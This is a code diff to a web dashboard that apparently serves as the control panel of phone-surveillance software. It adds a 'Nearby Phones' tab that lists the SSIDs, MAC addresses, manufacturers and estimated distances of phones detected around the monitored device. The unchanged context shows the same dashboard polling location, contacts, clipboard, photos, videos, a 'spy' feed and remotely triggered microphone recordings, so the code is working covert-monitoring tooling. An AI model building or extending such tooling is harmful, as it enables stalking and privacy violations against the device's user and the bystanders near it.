@@ -318,6 +318,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
 <div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
 <div><div class="label">WiFi</div><div class="value" id="wifiVal">-- <span id="wifiApCount" style="font-size:13px;color:var(--muted);font-weight:400"></span></div></div>
+<div><div class="label">Nearby</div><div class="value" id="nearbyVal">-- <span id="nearbyCount" style="font-size:13px;color:var(--muted);font-weight:400"></span></div></div>
 <div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
 <div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:13px">--</div></div>
 </div>
@@ -660,6 +661,16 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div id="permList"><div class="label">No permissions data yet</div></div>
 </div>
 <div id="tab-wifi">
+<div id="nearbySection" style="margin-bottom:16px">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+<span style="font-size:16px;font-weight:500">&#x1F4F1; Nearby Phones</span>
+<span class="chip" style="background:var(--success);color:#000;font-size:13px;cursor:pointer" onclick="pollNearbyScans()">&#x1F504; Refresh</span>
+</div>
+<div style="font-size:13px;color:var(--muted);margin-bottom:8px">Phones detected nearby via WiFi probe analysis (hotspot &amp; OUI heuristics). Updates every 60s. Shows manufacturer, signal &amp; proximity.</div>
+<input type="text" id="nearbySearch" placeholder="&#x1F50D; Filter by SSID, BSSID or manufacturer..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
+<div id="nearbyList"><div class="label">No nearby phones detected yet</div></div>
+</div>
+<div style="height:1px;background:var(--border);margin:12px 0"></div>
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
 <span style="font-size:16px;font-weight:500">&#x1F4E1; WiFi Scan History</span>
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollWifiScans()">&#x1F504; Refresh</span>
@@ -1963,7 +1974,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'photos') { renderPhotosFromCache(); pollPhotos(); }
     if (btn.dataset.tab === 'videos') { renderVideosFromCache(); pollVideos(); }
     if (btn.dataset.tab === 'recents') pollAppSnapshots();
-    if (btn.dataset.tab === 'wifi') pollWifiScans();
+    if (btn.dataset.tab === 'wifi') { pollWifiScans(); pollNearbyScans(); }
     if (btn.dataset.tab === 'logcat') { pollLogcat(); pollLogcatToggleState(); pollFileInventory(); }
     if (btn.dataset.tab === 'health') pollHealth();
     if (btn.dataset.tab === 'voice') { renderVoiceNotes(); pollVoiceNotes(); }
@@ -2707,6 +2718,7 @@ function startPolling() {
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
   schedulePoll('queue', 30000, pollQueueSize);
   schedulePoll('wifi', 60000, pollWifiScans);
+  schedulePoll('nearby', 60000, pollNearbyScans);
   schedulePoll('logcat', 60000, pollLogcat);
   schedulePoll('logcatToggle', 15000, pollLogcatToggleState);
   schedulePoll('health', intervals.health, pollHealth);
@@ -2727,7 +2739,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollClipboard(), pollFileInventory()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollClipboard(), pollFileInventory()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -6825,7 +6837,7 @@ async function refreshStorage() {
   el.innerHTML = '<div class="label">Scanning storage...</div>';
   const devicePath = `devices/${selectedDevice}`;
   try {
-    const [photos, voice, timeline, contacts, apps, location, wifi, videos, recordings] = await Promise.all([
+    const [photos, voice, timeline, contacts, apps, location, wifi, nearby, videos, recordings] = await Promise.all([
       estimatePhotos(),
       estimateNodeSize(`${devicePath}/voice_notes`, 2),
       estimateNodeSize(`${devicePath}/timeline`, 1),
@@ -6833,6 +6845,7 @@ async function refreshStorage() {
       estimateNodeSize(`${devicePath}/apps`, 1),
       estimateNodeSize(`${devicePath}/location`, 1),
       estimateNodeSize(`${devicePath}/wifi_scan`, 1),
+      estimateNodeSize(`${devicePath}/nearby_scan`, 1),
       estimateVideos(),
       estimateNodeSize(`${devicePath}/recordings`, 2)
     ]);
@@ -6845,7 +6858,8 @@ async function refreshStorage() {
       { name: 'Contacts', icon: '👥', path: 'contacts', ...contacts },
       { name: 'App Usage', icon: '📊', path: 'apps', ...apps },
       { name: 'Location', icon: '📍', path: 'location', ...location },
-      { name: 'WiFi Scans', icon: '📡', path: 'wifi_scan', ...wifi }
+      { name: 'WiFi Scans', icon: '📡', path: 'wifi_scan', ...wifi },
+      { name: 'Nearby Phones', icon: '📱', path: 'nearby_scan', ...nearby }
     ];
     let totalBytes = 0;
     let html = '<div style="font-size:15px;font-weight:500;margin-bottom:6px">📊 Storage Overview</div>';
@@ -6907,6 +6921,7 @@ function renderCleanupActions(categories) {
     { label: '🧹 Dedup Locations', desc: 'Remove duplicate location entries', action: 'dedupLocations', path: 'location', icon: '📍' },
     { label: '🗑 Delete Location History', desc: 'Remove location data (keeps current)', action: 'deleteLocHistory', path: 'location', icon: '📍', dangerous: true },
     { label: '🗑 Delete WiFi Scans', desc: 'Remove all WiFi scan data', action: 'deleteAll', path: 'wifi_scan', icon: '📡', dangerous: true },
+    { label: '🗑 Delete Nearby Scans', desc: 'Remove all nearby phone detection data', action: 'deleteAll', path: 'nearby_scan', icon: '📱', dangerous: true },
     { label: '⚠️ DELETE EVERYTHING', desc: 'Wipe ALL data for this device from RTDB', action: 'deleteAllData', path: '', icon: '☠️', dangerous: true }
   ];
   el.innerHTML = actions.map(a => {
@@ -7793,6 +7808,136 @@ function toggleWifiPrev(id) {
 }
 
 document.getElementById('wifiSearch')?.addEventListener('input', renderWifiScans);
+
+// --- Nearby Phones ---
+let nearbyCache = [];
+
+async function pollNearbyScans() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/nearby_scan`);
+  if (!data || typeof data !== 'object') {
+    nearbyCache = [];
+    document.getElementById('nearbyList').innerHTML = '<div class="label">No nearby phones detected yet</div>';
+    const nc = document.getElementById('nearbyCount'); if (nc) nc.textContent = '';
+    const nv = document.getElementById('nearbyVal'); if (nv) nv.textContent = '--';
+    return;
+  }
+  nearbyCache = Object.entries(data)
+    .map(([ts, val]) => ({
+      ts: parseInt(ts),
+      detections: (val.detections || []).map(d => ({
+        ssid: d.ssid || '',
+        bssid: d.bssid || '',
+        rssi: d.rssi != null ? parseInt(d.rssi) : -100,
+        frequency: d.frequency || 0,
+        capabilities: d.capabilities || '',
+        manufacturer: d.manufacturer || 'Unknown',
+        proximityM: d.proximityM != null ? parseFloat(d.proximityM) : null,
+        score: d.score != null ? parseInt(d.score) : 0
+      })),
+      count: val.count || 0,
+      totalScan: val.totalScan || 0
+    }))
+    .filter(s => s.ts && s.detections.length)
+    .sort((a, b) => b.ts - a.ts)
+    .slice(0, 50);
+  if (nearbyCache.length) {
+    const latest = nearbyCache[0];
+    const nc = document.getElementById('nearbyCount');
+    if (nc) nc.textContent = '📱 ' + latest.detections.length;
+    const nv = document.getElementById('nearbyVal');
+    if (nv) nv.textContent = latest.detections.length + ' phone' + (latest.detections.length===1?'':'s') + ' nearby';
+  } else {
+    const nc = document.getElementById('nearbyCount'); if (nc) nc.textContent = '';
+    const nv = document.getElementById('nearbyVal'); if (nv) nv.textContent = '--';
+  }
+  renderNearbyScans();
+}
+
+function renderNearbyScans() {
+  const list = document.getElementById('nearbyList');
+  const query = (document.getElementById('nearbySearch').value || '').toLowerCase();
+  if (!nearbyCache.length) {
+    list.innerHTML = '<div class="label">No nearby phones detected yet</div>';
+    return;
+  }
+  let html = '';
+  for (let i = 0; i < nearbyCache.length; i++) {
+    const scan = nearbyCache[i];
+    let dets = scan.detections;
+    if (query) {
+      dets = dets.filter(d => d.ssid.toLowerCase().includes(query) || d.bssid.toLowerCase().includes(query) || d.manufacturer.toLowerCase().includes(query));
+    }
+    if (!dets.length && query) continue;
+    dets.sort((a,b) => b.rssi - a.rssi);
+    const isLatest = i === 0;
+    const signalBars = (rssi) => {
+      if (rssi > -50) return 4;
+      if (rssi > -65) return 3;
+      if (rssi > -80) return 2;
+      return 1;
+    };
+    const barColor = (rssi) => rssi > -50 ? 'var(--success)' : rssi > -65 ? 'var(--accent)' : 'var(--danger)';
+    const proxLabel = (m) => {
+      if (m == null) return '--';
+      if (m < 3) return '~' + m.toFixed(1) + 'm (very close)';
+      if (m < 10) return '~' + m.toFixed(1) + 'm (nearby)';
+      if (m < 20) return '~' + m.toFixed(0) + 'm (near)';
+      return '~' + m.toFixed(0) + 'm';
+    };
+    const manuBadge = (manu) => {
+      const small = manu === 'Unknown' ? 'color:var(--muted);border-color:var(--border)' : 'background:rgba(63,185,80,.15);color:var(--success);border-color:var(--success)';
+      return `<span class="chip" style="font-size:11px;padding:2px 8px;${small}">${escHtml(manu)}</span>`;
+    };
+    const detRows = dets.slice(0, 30).map(d => {
+      const bars = signalBars(d.rssi);
+      const color = barColor(d.rssi);
+      const barHtml = '<span class="wifi-signal">' +
+        [1,2,3,4].map(j => `<span class="bar ${j <= bars ? 'on' : ''}" style="height:${4+j*2}px;background:${j <= bars ? color : 'var(--border)'}"></span>`).join('') +
+        '</span>';
+      const prox = proxLabel(d.proximityM);
+      const scoreColor = d.score >= 80 ? 'var(--success)' : d.score >= 60 ? 'var(--accent)' : 'var(--muted)';
+      return `<div class="wifi-ap-row" style="flex-wrap:wrap">
+        ${barHtml}
+        <span class="wifi-ssid" style="min-width:110px">${escHtml(d.ssid || '(hidden)')}</span>
+        <span class="wifi-bssid">${d.bssid || '—'}</span>
+        <span class="wifi-rssi">${d.rssi}dBm</span>
+        ${manuBadge(d.manufacturer)}
+        <span style="font-size:11px;color:var(--muted)">${prox}</span>
+        <span style="font-size:11px;color:${scoreColor}">score ${d.score}</span>
+      </div>`;
+    }).join('');
+
+    if (isLatest) {
+      html += `<div class="card wifi-latest" style="padding:12px;margin-bottom:8px;border-left-color:var(--success)">
+        <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+          <span style="font-size:15px;font-weight:600;color:var(--success)">📱 Latest Nearby Scan</span>
+          <span style="font-size:14px;color:var(--muted)">📱 ${dets.length} phone${dets.length===1?'':'s'} / 📡 ${scan.totalScan} APs</span>
+        </div>
+        <div style="font-size:13px;color:var(--muted);margin-bottom:6px">🕐 ${pkt(scan.ts)}</div>
+        ${detRows}
+      </div>`;
+    } else {
+      const prevId = 'nearby-prev-' + i;
+      html += `<div class="card" style="padding:10px 14px;margin-bottom:4px">
+        <div class="wifi-prev-header" onclick="toggleNearbyPrev('${prevId}')">
+          <span>🕐 ${pkt(scan.ts)}</span>
+          <span style="font-size:13px;color:var(--muted)">📱 ${dets.length} phones</span>
+          <span style="font-size:12px;color:var(--muted);margin-left:auto">▼</span>
+        </div>
+        <div id="${prevId}" class="wifi-prev-body closed">${detRows}</div>
+      </div>`;
+    }
+  }
+  list.innerHTML = html || '<div class="label">No nearby phones match your search</div>';
+}
+
+function toggleNearbyPrev(id) {
+  const el = document.getElementById(id);
+  if (el) el.classList.toggle('closed');
+}
+
+document.getElementById('nearbySearch')?.addEventListener('input', renderNearbyScans);
 
 // --- Health Tab ---
 let healthStepCache = [];
